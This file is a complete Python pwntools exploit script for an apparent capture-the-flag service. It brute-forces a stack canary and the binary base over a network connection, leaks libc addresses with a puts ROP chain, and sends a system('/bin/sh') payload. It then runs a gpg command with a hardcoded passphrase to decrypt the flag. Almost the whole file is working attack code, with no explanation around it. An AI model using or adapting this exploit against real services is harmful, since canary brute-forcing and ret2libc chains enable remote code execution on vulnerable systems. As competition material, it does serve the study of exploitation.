from pwn import *

#context.log_level = 'debug'

def read_banner(p):
    p.recvuntil("input> ")

def connect():
	return remote("leakit.eatpwnnosleep.com", 42424)
	return remote('localhost', 1234)

def search(canary):
    num = 8 - len(canary)
    for i in xrange(num):
        for j in xrange(0, 256):
            try:
                #p = remote('localhost', 1234)
		p = connect()
                print("%dth try" % j)
                read_banner(p)
                p.send("1\n")
                p.recvuntil("id: ")
                p.send("B"*0x40)
                p.recvuntil("passphrase: ")
                p.send("A"*0x3f)

                read_banner(p)
                p.send("3\n")

                for i in xrange(3):
                    p.recvuntil("msg (type 'SEND' to send): ")
                    p.send("\xcc"*1023)

                remainder = 4104 + 1 + len(canary) - 1023 * 3 - 1024
                p.recvuntil("msg (type 'SEND' to send): ")
                p.send("A"*(remainder))

                p.recvuntil("msg (type 'SEND' to send): ")
                p.send((canary + chr(j)).rjust(1024))

                for i in xrange(3):
                    m = p.readline()
		if "stack smash" in m:
			continue

                canary += chr(j)
                print("FOUND CANARY: %s" % canary.encode("hex"))
                break
            except EOFError:
                pass
            finally:
                p.close()

    return canary

def search_bin_base(canary, xx):
    num = 8 - len(canary)
    for i in xrange(num):
        for j in xrange(0, 256):
            try:
                #p = remote('localhost', 1234)
		p = connect()
                print("%dth try" % j)
                read_banner(p)
                p.send("1\n")
                p.recvuntil("id: ")
                p.send("B"*0x40)
                p.recvuntil("passphrase: ")
                p.send("A"*0x3f)

                read_banner(p)
                p.send("3\n")

                for i in xrange(3):
                    p.recvuntil("msg (type 'SEND' to send): ")
                    p.send("\xcc"*1023)

                remainder = 4104 + 1 + 16 + len(canary) - 1023 * 3 - 1024
                p.recvuntil("msg (type 'SEND' to send): ")
                p.send("A"*(remainder))

                p.recvuntil("msg (type 'SEND' to send): ")
                p.send((xx + "A"*8 + canary + chr(j)).rjust(1024))

                for i in xrange(3):
                    m = p.readline()

                if "[-] You need to initialize your GPG key" in m:
                    canary += chr(j)
                    print("FOUND CANARY: %s" % canary.encode("hex"))
                    break
            except EOFError:
                pass
            finally:
                p.close()

    return canary


def bof(canary, payload):
    try:
        #p = remote('localhost', 1234)
	p = connect()
        read_banner(p)
        p.send("1\n")
        p.recvuntil("id: ")
        p.send("B"*0x40)
        p.recvuntil("passphrase: ")
        p.send("A"*0x3f)

        read_banner(p)
        p.send("3\n")

        for i in xrange(3):
            p.recvuntil("msg (type 'SEND' to send): ")
            p.send("\xcc"*1023)

        remainder = 4104 + 16 + len(payload) - 1023 * 3 - 1024
        p.recvuntil("msg (type 'SEND' to send): ")
        p.send("A"*(remainder))

        p.recvuntil("msg (type 'SEND' to send): ")
        p.send((canary + "A"*8 + payload).rjust(1024))

        for i in xrange(3):
            m = p.readline()
    finally:
        p.close()

    return m

#canary = search("\x00")
#raise
canary = "00d21fed1133908f".decode("hex")
#bin_base = search_bin_base("a1".decode("hex"), canary)
bin_base = u64("a18978cea3550000".decode("hex")) - 0x29A1
print("BIN_BASE: %x" % bin_base)

puts_plt = bin_base + 0x1250
puts_got = bin_base + 0x204670
pop_rdi_ret = bin_base + 0x2F23

libc_base = u64(bof(canary, p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)).strip().ljust(8, "\x00")) - 0x000000000006f690

environ_addr = libc_base + 0x3C6F38
environ = u64(bof(canary, p64(pop_rdi_ret) + p64(environ_addr) + p64(puts_plt)).strip().ljust(8, "\x00"))

# i = 0
# while True:
#     e = bof(canary, p64(pop_rdi_ret) + p64(environ - i * 8) + p64(puts_plt))
#     print("ENVIRON: %s" % e)
#     i += 1
# 

system = libc_base + 0x45390 
bin_sh = libc_base + 0x18CD57
payload = p64(pop_rdi_ret) + p64(bin_sh) + p64(system)

p = connect()
read_banner(p)
p.send("1\n")
p.recvuntil("id: ")
p.send("B"*0x40)
p.recvuntil("passphrase: ")
p.send("A"*0x3f)

read_banner(p)
p.send("3\n")

for i in xrange(3):
    p.recvuntil("msg (type 'SEND' to send): ")
    p.send("\xcc"*1023)

remainder = 4104 + 16 + len(payload) - 1023 * 3 - 1024
p.recvuntil("msg (type 'SEND' to send): ")
p.send("A"*(remainder))

p.recvuntil("msg (type 'SEND' to send): ")
p.send((canary + "A"*8 + payload).rjust(1024))

p.send("echo YOUCANNOTFINDTHISPASSPHRASEITSVERYLONGRIGHTHUH|gpg --options admin_gpg.conf --no-tty  --default-key admin@2018.eatpwnnosleep.com --passphrase-fd 0  --decrypt flag_to_admin.enc\n")
p.interactive()

